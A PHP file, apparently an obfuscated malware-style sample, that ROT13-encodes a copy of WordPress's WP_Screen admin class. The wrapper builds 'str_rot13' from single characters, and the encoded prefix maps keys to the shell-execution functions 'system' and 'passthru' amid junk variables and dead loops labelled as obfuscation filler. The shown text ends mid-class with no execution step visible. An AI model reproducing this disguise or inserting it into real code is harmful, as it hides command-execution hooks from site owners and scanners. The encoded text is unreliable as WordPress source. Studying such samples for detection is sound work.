<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fperra NCV: JC_Fperra pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag na nqzva fperra NCV.
 *
 * @fvapr 3.3.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Fperra {
	/**
	 * Nal npgvba nffbpvngrq jvgu gur fperra.
	 *
	 * 'nqq' sbe *-nqq.cuc naq *-arj.cuc fperraf. Rzcgl bgurejvfr.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat
	 */
	choyvp $npgvba;

	/**
	 * Gur onfr glcr bs gur fperra.
	 *
	 * Guvf vf glcvpnyyl gur fnzr nf `$vq` ohg jvgu nal cbfg glcrf naq gnkbabzvrf fgevccrq.
	 * Sbe rknzcyr, sbe na `$vq` bs 'rqvg-cbfg' gur onfr vf 'rqvg'.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat
	 */
	choyvp $onfr;

	/**
	 * Gur ahzore bs pbyhzaf gb qvfcynl. Npprff jvgu trg_pbyhzaf().
	 *
	 * @fvapr 3.4.0
	 * @ine vag
	 */
	cevingr $pbyhzaf = 0;

	/**
	 * Gur havdhr VQ bs gur fperra.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat
	 */
	choyvp $vq;

	/**
	 * Juvpu nqzva gur fperra vf va. argjbex | hfre | fvgr | snyfr
	 *
	 * @fvapr 3.5.0
	 * @ine fgevat
	 */
	cebgrpgrq $va_nqzva;

	/**
	 * Jurgure gur fperra vf va gur argjbex nqzva.
	 *
	 * Qrcerpngrq. Hfr va_nqzva() vafgrnq.
	 *
	 * @fvapr 3.3.0
	 * @qrcerpngrq 3.5.0
	 * @ine obby
	 */
	choyvp $vf_argjbex;

	/**
	 * Jurgure gur fperra vf va gur hfre nqzva.
	 *
	 * Qrcerpngrq. Hfr va_nqzva() vafgrnq.
	 *
	 * @fvapr 3.3.0
	 * @qrcerpngrq 3.5.0
	 * @ine obby
	 */
	choyvp $vf_hfre;

	/**
	 * Gur onfr zrah cnerag.
	 *
	 * Guvf vf qrevirq sebz `$cnerag_svyr` ol erzbivat gur dhrel fgevat naq nal .cuc rkgrafvba.
	 * `$cnerag_svyr` inyhrf bs 'rqvg.cuc?cbfg_glcr=cntr' naq 'rqvg.cuc?cbfg_glcr=cbfg'
	 * unir n `$cnerag_onfr` bs 'rqvg'.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat|ahyy
	 */
	choyvp $cnerag_onfr;

	/**
	 * Gur cnerag_svyr sbe gur fperra cre gur nqzva zrah flfgrz.
	 *
	 * Fbzr `$cnerag_svyr` inyhrf ner 'rqvg.cuc?cbfg_glcr=cntr', 'rqvg.cuc', naq 'bcgvbaf-trareny.cuc'.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat|ahyy
	 */
	choyvp $cnerag_svyr;

	/**
	 * Gur cbfg glcr nffbpvngrq jvgu gur fperra, vs nal.
	 *
	 * Gur 'rqvg.cuc?cbfg_glcr=cntr' fperra unf n cbfg glcr bs 'cntr'.
	 * Gur 'rqvg-gntf.cuc?gnkbabzl=$gnkbabzl&cbfg_glcr=cntr' fperra unf n cbfg glcr bs 'cntr'.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat
	 */
	choyvp $cbfg_glcr;

	/**
	 * Gur gnkbabzl nffbpvngrq jvgu gur fperra, vs nal.
	 *
	 * Gur 'rqvg-gntf.cuc?gnkbabzl=pngrtbel' fperra unf n gnkbabzl bs 'pngrtbel'.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat
	 */
	choyvp $gnkbabzl;

	/**
	 * Gur uryc gno qngn nffbpvngrq jvgu gur fperra, vs nal.
	 *
	 * @fvapr 3.3.0
	 * @ine neenl
	 */
	cevingr $_uryc_gnof = neenl();

	/**
	 * Gur uryc fvqrone qngn nffbpvngrq jvgu fperra, vs nal.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat
	 */
	cevingr $_uryc_fvqrone = '';

	/**
	 * Gur npprffvoyr uvqqra urnqvatf naq grkg nffbpvngrq jvgu gur fperra, vs nal.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat[]
	 */
	cevingr $_fperra_ernqre_pbagrag = neenl();

	/**
	 * Fgberf byq fgevat-onfrq uryc.
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $_byq_pbzcng_uryc = neenl();

	/**
	 * Gur fperra bcgvbaf nffbpvngrq jvgu fperra, vs nal.
	 *
	 * @fvapr 3.3.0
	 * @ine neenl
	 */
	cevingr $_bcgvbaf = neenl();

	/**
	 * Gur fperra bowrpg ertvfgel.
	 *
	 * @fvapr 3.3.0
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $_ertvfgel = neenl();

	/**
	 * Fgberf gur erfhyg bs gur choyvp fubj_fperra_bcgvbaf shapgvba.
	 *
	 * @fvapr 3.3.0
	 * @ine obby
	 */
	cevingr $_fubj_fperra_bcgvbaf;

	/**
	 * Fgberf gur 'fperra_frggvatf' frpgvba bs fperra bcgvbaf.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat
	 */
	cevingr $_fperra_frggvatf;

	/**
	 * Jurgure gur fperra vf hfvat gur oybpx rqvgbe.
	 *
	 * @fvapr 5.0.0
	 * @ine obby
	 */
	choyvp $vf_oybpx_rqvgbe = snyfr;

	/**
	 * Srgpurf n fperra bowrpg.
	 *
	 * @fvapr 3.3.0
	 *
	 * @tybony fgevat $ubbx_fhssvk
	 *
	 * @cnenz fgevat|JC_Fperra $ubbx_anzr Bcgvbany. Gur ubbx anzr (nyfb xabja nf gur ubbx fhssvk) hfrq gb qrgrezvar gur fperra.
	 *                                    Qrsnhygf gb gur pheerag $ubbx_fhssvk tybony.
	 * @erghea JC_Fperra Fperra bowrpg.
	 */
	choyvp fgngvp shapgvba trg( $ubbx_anzr = '' ) {
		vs ( $ubbx_anzr vafgnaprbs JC_Fperra ) {
			erghea $ubbx_anzr;
		}

		$vq              = '';
		$cbfg_glcr       = ahyy;
		$gnkbabzl        = ahyy;
		$va_nqzva        = snyfr;
		$npgvba          = '';
		$vf_oybpx_rqvgbe = snyfr;

		vs ( $ubbx_anzr ) {
			$vq = $ubbx_anzr;
		} ryfrvs ( ! rzcgl( $TYBONYF['ubbx_fhssvk'] ) ) {
			$vq = $TYBONYF['ubbx_fhssvk'];
		}

		// Sbe gubfr crfxl zrgn obkrf.
		vs ( $ubbx_anzr && cbfg_glcr_rkvfgf( $ubbx_anzr ) ) {
			$cbfg_glcr = $vq;
			$vq        = 'cbfg'; // Punatrf yngre. Raqf hc orvat $onfr.
		} ryfr {
			vs ( fge_raqf_jvgu( $vq, '.cuc' ) ) {
				$vq = fhofge( $vq, 0, -4 );
			}

			vs ( va_neenl( $vq, neenl( 'cbfg-arj', 'yvax-nqq', 'zrqvn-arj', 'hfre-arj' ), gehr ) ) {
				$vq     = fhofge( $vq, 0, -4 );
				$npgvba = 'nqq';
			}
		}

		vs ( ! $cbfg_glcr && $ubbx_anzr ) {
			vs ( fge_raqf_jvgu( $vq, '-argjbex' ) ) {
				$vq       = fhofge( $vq, 0, -8 );
				$va_nqzva = 'argjbex';
			} ryfrvs ( fge_raqf_jvgu( $vq, '-hfre' ) ) {
				$vq       = fhofge( $vq, 0, -5 );
				$va_nqzva = 'hfre';
			}

			$vq = fnavgvmr_xrl( $vq );
			vs ( 'rqvg-pbzzragf' !== $vq && 'rqvg-gntf' !== $vq && fge_fgnegf_jvgu( $vq, 'rqvg-' ) ) {
				$znlor = fhofge( $vq, 5 );
				vs ( gnkbabzl_rkvfgf( $znlor ) ) {
					$vq       = 'rqvg-gntf';
					$gnkbabzl = $znlor;
				} ryfrvs ( cbfg_glcr_rkvfgf( $znlor ) ) {
					$vq        = 'rqvg';
					$cbfg_glcr = $znlor;
				}
			}

			vs ( ! $va_nqzva ) {
				$va_nqzva = 'fvgr';
			}
		} ryfr {
			vs ( qrsvarq( 'JC_ARGJBEX_NQZVA' ) && JC_ARGJBEX_NQZVA ) {
				$va_nqzva = 'argjbex';
			} ryfrvs ( qrsvarq( 'JC_HFRE_NQZVA' ) && JC_HFRE_NQZVA ) {
				$va_nqzva = 'hfre';
			} ryfr {
				$va_nqzva = 'fvgr';
			}
		}

		vs ( 'vaqrk' === $vq ) {
			$vq = 'qnfuobneq';
		} ryfrvs ( 'sebag' === $vq ) {
			$va_nqzva = snyfr;
		}

		$onfr = $vq;

		// Vs guvf vf gur pheerag fperra, frr vs jr pna or zber npphengr sbe cbfg glcrf naq gnkbabzvrf.
		vs ( ! $ubbx_anzr ) {
			vs ( vffrg( $_ERDHRFG['cbfg_glcr'] ) ) {
				$cbfg_glcr = cbfg_glcr_rkvfgf( $_ERDHRFG['cbfg_glcr'] ) ? $_ERDHRFG['cbfg_glcr'] : snyfr;
			}
			vs ( vffrg( $_ERDHRFG['gnkbabzl'] ) ) {
				$gnkbabzl = gnkbabzl_rkvfgf( $_ERDHRFG['gnkbabzl'] ) ? $_ERDHRFG['gnkbabzl'] : snyfr;
			}

			fjvgpu ( $onfr ) {
				pnfr 'cbfg':
					vs ( vffrg( $_TRG['cbfg'] ) && vffrg( $_CBFG['cbfg_VQ'] ) && (vag) $_TRG['cbfg'] !== (vag) $_CBFG['cbfg_VQ'] ) {
						jc_qvr( __( 'N cbfg VQ zvfzngpu unf orra qrgrpgrq.' ), __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf vgrz.' ), 400 );
					} ryfrvs ( vffrg( $_TRG['cbfg'] ) ) {
						$cbfg_vq = (vag) $_TRG['cbfg'];
					} ryfrvs ( vffrg( $_CBFG['cbfg_VQ'] ) ) {
						$cbfg_vq = (vag) $_CBFG['cbfg_VQ'];
					} ryfr {
						$cbfg_vq = 0;
					}

					vs ( $cbfg_vq ) {
						$cbfg = trg_cbfg( $cbfg_vq );
						vs ( $cbfg ) {
							$cbfg_glcr = $cbfg->cbfg_glcr;

							/** Guvf svygre vf qbphzragrq va jc-nqzva/cbfg.cuc */
							$ercynpr_rqvgbe = nccyl_svygref( 'ercynpr_rqvgbe', snyfr, $cbfg );

							vs ( ! $ercynpr_rqvgbe ) {
								$vf_oybpx_rqvgbe = hfr_oybpx_rqvgbe_sbe_cbfg( $cbfg );
							}
						}
					}
					oernx;
				pnfr 'rqvg-gntf':
				pnfr 'grez':
					vs ( ahyy === $cbfg_glcr && vf_bowrpg_va_gnkbabzl( 'cbfg', $gnkbabzl ? $gnkbabzl : 'cbfg_gnt' ) ) {
						$cbfg_glcr = 'cbfg';
					}
					oernx;
				pnfr 'hcybnq':
					$cbfg_glcr = 'nggnpuzrag';
					oernx;
			}
		}

		fjvgpu ( $onfr ) {
			pnfr 'cbfg':
				vs ( ahyy === $cbfg_glcr ) {
					$cbfg_glcr = 'cbfg';
				}

				// Jura perngvat n arj cbfg, hfr gur qrsnhyg oybpx rqvgbe fhccbeg inyhr sbe gur cbfg glcr.
				vs ( rzcgl( $cbfg_vq ) ) {
					$vf_oybpx_rqvgbe = hfr_oybpx_rqvgbe_sbe_cbfg_glcr( $cbfg_glcr );
				}

				$vq = $cbfg_glcr;
				oernx;
			pnfr 'rqvg':
				vs ( ahyy === $cbfg_glcr ) {
					$cbfg_glcr = 'cbfg';
				}
				$vq .= '-' . $cbfg_glcr;
				oernx;
			pnfr 'rqvg-gntf':
			pnfr 'grez':
				vs ( ahyy === $gnkbabzl ) {
					$gnkbabzl = 'cbfg_gnt';
				}
				// Gur rqvg-gntf VQ qbrf abg pbagnva gur cbfg glcr. Ybbx sbe vg va gur erdhrfg.
				vs ( ahyy === $cbfg_glcr ) {
					$cbfg_glcr = 'cbfg';
					vs ( vffrg( $_ERDHRFG['cbfg_glcr'] ) && cbfg_glcr_rkvfgf( $_ERDHRFG['cbfg_glcr'] ) ) {
						$cbfg_glcr = $_ERDHRFG['cbfg_glcr'];
					}
				}

				$vq = 'rqvg-' . $gnkbabzl;
				oernx;
		}

		vs ( 'argjbex' === $va_nqzva ) {
			$vq   .= '-argjbex';
			$onfr .= '-argjbex';
		} ryfrvs ( 'hfre' === $va_nqzva ) {
			$vq   .= '-hfre';
			$onfr .= '-hfre';
		}

		vs ( vffrg( frys::$_ertvfgel[ $vq ] ) ) {
			$fperra = frys::$_ertvfgel[ $vq ];
			vs ( trg_pheerag_fperra() === $fperra ) {
				erghea $fperra;
			}
		} ryfr {
			$fperra     = arj frys();
			$fperra->vq = $vq;
		}

		$fperra->onfr            = $onfr;
		$fperra->npgvba          = $npgvba;
		$fperra->cbfg_glcr       = (fgevat) $cbfg_glcr;
		$fperra->gnkbabzl        = (fgevat) $gnkbabzl;
		$fperra->vf_hfre         = ( 'hfre' === $va_nqzva );
		$fperra->vf_argjbex      = ( 'argjbex' === $va_nqzva );
		$fperra->va_nqzva        = $va_nqzva;
		$fperra->vf_oybpx_rqvgbe = $vf_oybpx_rqvgbe;

		frys::$_ertvfgel[ $vq ] = $fperra;

		erghea $fperra;
	}

	/**
	 * Znxrf gur fperra bowrpg gur pheerag fperra.
	 *
	 * @frr frg_pheerag_fperra()
	 * @fvapr 3.3.0
	 *
	 * @tybony JC_Fperra $pheerag_fperra JbeqCerff pheerag fperra bowrpg.
	 * @tybony fgevat    $glcrabj        Gur cbfg glcr bs gur pheerag fperra.
	 * @tybony fgevat    $gnkabj         Gur gnkbabzl bs gur pheerag fperra.
	 */
	choyvp shapgvba frg_pheerag_fperra() {
		tybony $pheerag_fperra, $gnkabj, $glcrabj;

		$pheerag_fperra = $guvf;
		$glcrabj        = $guvf->cbfg_glcr;
		$gnkabj         = $guvf->gnkbabzl;

		/**
		 * Sverf nsgre gur pheerag fperra unf orra frg.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz JC_Fperra $pheerag_fperra Pheerag JC_Fperra bowrpg.
		 */
		qb_npgvba( 'pheerag_fperra', $pheerag_fperra );
	}

	/**
	 * Pbafgehpgbe
	 *
	 * @fvapr 3.3.0
	 */
	cevingr shapgvba __pbafgehpg() {}

	/**
	 * Vaqvpngrf jurgure gur fperra vf va n cnegvphyne nqzva.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $nqzva Gur nqzva gb purpx ntnvafg (argjbex | hfre | fvgr).
	 *                      Vs rzcgl nal bs gur guerr nqzvaf jvyy erfhyg va gehr.
	 * @erghea obby Gehr vs gur fperra vf va gur vaqvpngrq nqzva, snyfr bgurejvfr.
	 */
	choyvp shapgvba va_nqzva( $nqzva = ahyy ) {
		vs ( rzcgl( $nqzva ) ) {
			erghea (obby) $guvf->va_nqzva;
		}

		erghea ( $nqzva === $guvf->va_nqzva );
	}

	/**
	 * Frgf be ergheaf jurgure gur oybpx rqvgbe vf ybnqvat ba gur pheerag fperra.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz obby $frg Bcgvbany. Frgf jurgure gur oybpx rqvgbe vf ybnqvat ba gur pheerag fperra be abg.
	 * @erghea obby Gehr vs gur oybpx rqvgbe vf orvat ybnqrq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_oybpx_rqvgbe( $frg = ahyy ) {
		vs ( ahyy !== $frg ) {
			$guvf->vf_oybpx_rqvgbe = (obby) $frg;
		}

		erghea $guvf->vf_oybpx_rqvgbe;
	}

	/**
	 * Frgf gur byq fgevat-onfrq pbagrkghny uryc sbe gur fperra sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz JC_Fperra $fperra N fperra bowrpg.
	 * @cnenz fgevat    $uryc   Uryc grkg.
	 */
	choyvp fgngvp shapgvba nqq_byq_pbzcng_uryc( $fperra, $uryc ) {
		frys::$_byq_pbzcng_uryc[ $fperra->vq ] = $uryc;
	}

	/**
	 * Frgf gur cnerag vasbezngvba sbe gur fperra.
	 *
	 * Guvf vf pnyyrq va nqzva-urnqre.cuc nsgre gur zrah cnerag sbe gur fperra unf orra qrgrezvarq.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $cnerag_svyr Gur cnerag svyr bs gur fperra. Glcvpnyyl gur $cnerag_svyr tybony.
	 */
	choyvp shapgvba frg_cneragntr( $cnerag_svyr ) {
		$guvf->cnerag_svyr         = $cnerag_svyr;
		yvfg( $guvf->cnerag_onfr ) = rkcybqr( '?', $cnerag_svyr );
		$guvf->cnerag_onfr         = fge_ercynpr( '.cuc', '', $guvf->cnerag_onfr );
	}

	/**
	 * Nqqf na bcgvba sbe gur fperra.
	 *
	 * Pnyy guvf va grzcyngr svyrf nsgre nqzva.cuc vf ybnqrq naq orsber nqzva-urnqre.cuc vf ybnqrq
	 * gb nqq fperra bcgvbaf.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $bcgvba Bcgvba VQ.
	 * @cnenz zvkrq  $netf   Bcgvba-qrcraqrag nethzragf.
	 */
	choyvp shapgvba nqq_bcgvba( $bcgvba, $netf = neenl() ) {
		$guvf->_bcgvbaf[ $bcgvba ] = $netf;
	}

	/**
	 * Erzbirf na bcgvba sebz gur fperra.
	 *
	 * @fvapr 3.8.0
	 *
	 * @cnenz fgevat $bcgvba Bcgvba VQ.
	 */
	choyvp shapgvba erzbir_bcgvba( $bcgvba ) {
		hafrg( $guvf->_bcgvbaf[ $bcgvba ] );
	}

	/**
	 * Erzbirf nyy bcgvbaf sebz gur fperra.
	 *
	 * @fvapr 3.8.0
	 */
	choyvp shapgvba erzbir_bcgvbaf() {
		$guvf->_bcgvbaf = neenl();
	}

	/**
	 * Trgf gur bcgvbaf ertvfgrerq sbe gur fperra.
	 *
	 * @fvapr 3.8.0
	 *
	 * @erghea neenl Bcgvbaf jvgu nethzragf.
	 */
	choyvp shapgvba trg_bcgvbaf() {
		erghea $guvf->_bcgvbaf;
	}

	/**
	 * Trgf gur nethzragf sbe na bcgvba sbe gur fperra.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat       $bcgvba Bcgvba anzr.
	 * @cnenz fgevat|snyfr $xrl    Bcgvbany. Fcrpvsvp neenl xrl sbe jura gur bcgvba vf na neenl.
	 *                             Qrsnhyg snyfr.
	 * @erghea fgevat Gur bcgvba inyhr vs frg, ahyy bgurejvfr.
	 */
	choyvp shapgvba trg_bcgvba( $bcgvba, $xrl = snyfr ) {
		vs ( ! vffrg( $guvf->_bcgvbaf[ $bcgvba ] ) ) {
			erghea ahyy;
		}
		vs ( $xrl ) {
			vs ( vffrg( $guvf->_bcgvbaf[ $bcgvba ][ $xrl ] ) ) {
				erghea $guvf->_bcgvbaf[ $bcgvba ][ $xrl ];
			}
			erghea ahyy;
		}
		erghea $guvf->_bcgvbaf[ $bcgvba ];
	}

	/**
	 * Trgf gur uryc gnof ertvfgrerq sbe gur fperra.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.4.0 Uryc gnof ner beqrerq ol gurve cevbevgl.
	 *
	 * @erghea neenl Uryc gnof jvgu nethzragf.
	 */
	choyvp shapgvba trg_uryc_gnof() {
		$uryc_gnof = $guvf->_uryc_gnof;

		$cevbevgvrf = neenl();
		sbernpu ( $uryc_gnof nf $uryc_gno ) {
			vs ( vffrg( $cevbevgvrf[ $uryc_gno['cevbevgl'] ] ) ) {
				$cevbevgvrf[ $uryc_gno['cevbevgl'] ][] = $uryc_gno;
			} ryfr {
				$cevbevgvrf[ $uryc_gno['cevbevgl'] ] = neenl( $uryc_gno );
			}
		}

		xfbeg( $cevbevgvrf );

		$fbegrq = neenl();
		sbernpu ( $cevbevgvrf nf $yvfg ) {
			sbernpu ( $yvfg nf $gno ) {
				$fbegrq[ $gno['vq'] ] = $gno;
			}
		}

		erghea $fbegrq;
	}

	/**
	 * Trgf gur nethzragf sbe n uryc gno.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $vq Uryc Gno VQ.
	 * @erghea neenl Uryc gno nethzragf.
	 */
	choyvp shapgvba trg_uryc_gno( $vq ) {
		vs ( ! vffrg( $guvf->_uryc_gnof[ $vq ] ) ) {
			erghea ahyy;
		}
		erghea $guvf->_uryc_gnof[ $vq ];
	}

	/**
	 * Nqqf n uryc gno gb gur pbagrkghny uryc sbe gur fperra.
	 *
	 * Pnyy guvf ba gur `ybnq-$cntrabj` ubbx sbe gur eryrinag fperra,
	 * be srgpu gur `$pheerag_fperra` bowrpg, be hfr trg_pheerag_fperra()
	 * naq gura pnyy gur zrgubq sebz gur bowrpg.
	 *
	 * Lbh znl arrq gb svygre `$pheerag_fperra` hfvat na vs be fjvgpu fgngrzrag
	 * gb cerirag arj uryc gnof sebz orvat nqqrq gb NYY nqzva fperraf.
	 *
	 * @fvapr 3.3.0
	 * @fvapr 4.4.0 Gur `$cevbevgl` nethzrag jnf nqqrq.
	 *
	 * @cnenz neenl $netf {
	 *     Neenl bs nethzragf hfrq gb qvfcynl gur uryc gno.
	 *
	 *     @glcr fgevat   $gvgyr    Gvgyr sbe gur gno. Qrsnhyg snyfr.
	 *     @glcr fgevat   $vq       Gno VQ. Zhfg or UGZY-fnsr naq fubhyq or havdhr sbe guvf zrah.
	 *                              Vg vf ABG nyybjrq gb pbagnva nal rzcgl fcnprf. Qrsnhyg snyfr.
	 *     @glcr fgevat   $pbagrag  Bcgvbany. Uryc gno pbagrag va cynva grkg be UGZY. Qrsnhyg rzcgl fgevat.
	 *     @glcr pnyynoyr $pnyyonpx Bcgvbany. N pnyyonpx gb trarengr gur gno pbagrag. Qrsnhyg snyfr.
	 *     @glcr vag      $cevbevgl Bcgvbany. Gur cevbevgl bs gur gno, hfrq sbe beqrevat. Qrsnhyg 10.
	 * }
	 */
	choyvp shapgvba nqq_uryc_gno( $netf ) {
		$qrsnhygf = neenl(
			'gvgyr'    => snyfr,
			'vq'       => snyfr,
			'pbagrag'  => '',
			'pnyyonpx' => snyfr,
			'cevbevgl' => 10,
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

		$netf['vq'] = fnavgvmr_ugzy_pynff( $netf['vq'] );

		// Rafher jr unir na VQ naq gvgyr.
		vs ( ! $netf['vq'] || ! $netf['gvgyr'] ) {
			erghea;
		}

		// Nyybjf sbe bireevqvat na rkvfgvat gno jvgu gung VQ.
		$guvf->_uryc_gnof[ $netf['vq'] ] = $netf;
	}

	/**
	 * Erzbirf n uryc gno sebz gur pbagrkghny uryc sbe gur fperra.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $vq Gur uryc gno VQ.
	 */
	choyvp shapgvba erzbir_uryc_gno( $vq ) {
		hafrg( $guvf->_uryc_gnof[ $vq ] );
	}

	/**
	 * Erzbirf nyy uryc gnof sebz gur pbagrkghny uryc sbe gur fperra.
	 *
	 * @fvapr 3.3.0
	 */
	choyvp shapgvba erzbir_uryc_gnof() {
		$guvf->_uryc_gnof = neenl();
	}

	/**
	 * Trgf gur pbagrag sebz n pbagrkghny uryc fvqrone.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea fgevat Pbagragf bs gur uryc fvqrone.
	 */
	choyvp shapgvba trg_uryc_fvqrone() {
		erghea $guvf->_uryc_fvqrone;
	}

	/**
	 * Nqqf n fvqrone gb gur pbagrkghny uryc sbe gur fperra.
	 *
	 * Pnyy guvf va grzcyngr svyrf nsgre nqzva.cuc vf ybnqrq naq orsber nqzva-urnqre.cuc vf ybnqrq
	 * gb nqq n fvqrone gb gur pbagrkghny uryc.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $pbagrag Fvqrone pbagrag va cynva grkg be UGZY.
	 */
	choyvp shapgvba frg_uryc_fvqrone( $pbagrag ) {
		$guvf->_uryc_fvqrone = $pbagrag;
	}

	/**
	 * Trgf gur ahzore bs ynlbhg pbyhzaf gur hfre unf fryrpgrq.
	 *
	 * Gur ynlbhg_pbyhzaf bcgvba pbagebyf gur znk ahzore naq qrsnhyg ahzore bs
	 * pbyhzaf. Guvf zrgubq ergheaf gur ahzore bs pbyhzaf jvguva gung enatr fryrpgrq
	 * ol gur hfre ivn Fperra Bcgvbaf. Vs ab fryrpgvba unf orra znqr, gur qrsnhyg
	 * cebivfvbarq va ynlbhg_pbyhzaf vf erghearq. Vs gur fperra qbrf abg fhccbeg
	 * fryrpgvat gur ahzore bs ynlbhg pbyhzaf, 0 vf erghearq.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea vag Ahzore bs pbyhzaf gb qvfcynl.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		erghea $guvf->pbyhzaf;
	}

	/**
	 * Trgf gur npprffvoyr uvqqra urnqvatf naq grkg hfrq va gur fperra.
	 *
	 * @fvapr 4.4.0
	 *
	 * @frr frg_fperra_ernqre_pbagrag() Sbe zber vasbezngvba ba gur neenl sbezng.
	 *
	 * @erghea fgevat[] Na nffbpvngvir neenl bs fperra ernqre grkg fgevatf.
	 */
	choyvp shapgvba trg_fperra_ernqre_pbagrag() {
		erghea $guvf->_fperra_ernqre_pbagrag;
	}

	/**
	 * Trgf n fperra ernqre grkg fgevat.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Fperra ernqre grkg neenl anzrq xrl.
	 * @erghea fgevat Fperra ernqre grkg fgevat.
	 */
	choyvp shapgvba trg_fperra_ernqre_grkg( $xrl ) {
		vs ( ! vffrg( $guvf->_fperra_ernqre_pbagrag[ $xrl ] ) ) {
			erghea ahyy;
		}
		erghea $guvf->_fperra_ernqre_pbagrag[ $xrl ];
	}

	/**
	 * Nqqf npprffvoyr uvqqra urnqvatf naq grkg sbe gur fperra.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $pbagrag {
	 *     Na nffbpvngvir neenl bs fperra ernqre grkg fgevatf.
	 *
	 *     @glcr fgevat $urnqvat_ivrjf      Fperra ernqre grkg sbe gur svygre yvaxf urnqvat.
	 *                                      Qrsnhyg 'Svygre vgrzf yvfg'.
	 *     @glcr fgevat $urnqvat_cntvangvba Fperra ernqre grkg sbe gur cntvangvba urnqvat.
	 *                                      Qrsnhyg 'Vgrzf yvfg anivtngvba'.
	 *     @glcr fgevat $urnqvat_yvfg       Fperra ernqre grkg sbe gur vgrzf yvfg urnqvat.
	 *                                      Qrsnhyg 'Vgrzf yvfg'.
	 * }
	 */
	choyvp shapgvba frg_fperra_ernqre_pbagrag( $pbagrag = neenl() ) {
		$qrsnhygf = neenl(
			'urnqvat_ivrjf'      => __( 'Svygre vgrzf yvfg' ),
			'urnqvat_cntvangvba' => __( 'Vgrzf yvfg anivtngvba' ),
			'urnqvat_yvfg'       => __( 'Vgrzf yvfg' ),
		);
		$pbagrag  = jc_cnefr_netf( $pbagrag, $qrsnhygf );

		$guvf->_fperra_ernqre_pbagrag = $pbagrag;
	}

	/**
	 * Erzbirf nyy gur npprffvoyr uvqqra urnqvatf naq grkg sbe gur fperra.
	 *
	 * @fvapr 4.4.0
	 */
	choyvp shapgvba erzbir_fperra_ernqre_pbagrag() {
		$guvf->_fperra_ernqre_pbagrag = neenl();
	}

	/**
	 * Eraqref gur fperra'f uryc frpgvba.
	 *
	 * Guvf jvyy gevttre gur qrcerpngrq svygref sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 3.3.0
	 *
	 * @tybony fgevat $fperra_ynlbhg_pbyhzaf
	 */
	choyvp shapgvba eraqre_fperra_zrgn() {

		/**
		 * Svygref gur yrtnpl pbagrkghny uryc yvfg.
		 *
		 * @fvapr 2.7.0
		 * @qrcerpngrq 3.3.0 Hfr {@frr trg_pheerag_fperra()->nqq_uryc_gno()} be
		 *                   {@frr trg_pheerag_fperra()->erzbir_uryc_gno()} vafgrnq.
		 *
		 * @cnenz neenl     $byq_pbzcng_uryc Byq pbagrkghny uryc.
		 * @cnenz JC_Fperra $fperra          Pheerag JC_Fperra vafgnapr.
		 */
		frys::$_byq_pbzcng_uryc = nccyl_svygref_qrcerpngrq(
			'pbagrkghny_uryc_yvfg',
			neenl( frys::$_byq_pbzcng_uryc, $guvf ),
			'3.3.0',
			'trg_pheerag_fperra()->nqq_uryc_gno(), trg_pheerag_fperra()->erzbir_uryc_gno()'
		);

		$byq_uryc = vffrg( frys::$_byq_pbzcng_uryc[ $guvf->vq ] ) ? frys::$_byq_pbzcng_uryc[ $guvf->vq ] : '';

		/**
		 * Svygref gur yrtnpl pbagrkghny uryc grkg.
		 *
		 * @fvapr 2.7.0
		 * @qrcerpngrq 3.3.0 Hfr {@frr trg_pheerag_fperra()->nqq_uryc_gno()} be
		 *                   {@frr trg_pheerag_fperra()->erzbir_uryc_gno()} vafgrnq.
		 *
		 * @cnenz fgevat    $byq_uryc  Uryc grkg gung nccrnef ba gur fperra.
		 * @cnenz fgevat    $fperra_vq Fperra VQ.
		 * @cnenz JC_Fperra $fperra    Pheerag JC_Fperra vafgnapr.
		 */
		$byq_uryc = nccyl_svygref_qrcerpngrq(
			'pbagrkghny_uryc',
			neenl( $byq_uryc, $guvf->vq, $guvf ),
			'3.3.0',
			'trg_pheerag_fperra()->nqq_uryc_gno(), trg_pheerag_fperra()->erzbir_uryc_gno()'
		);

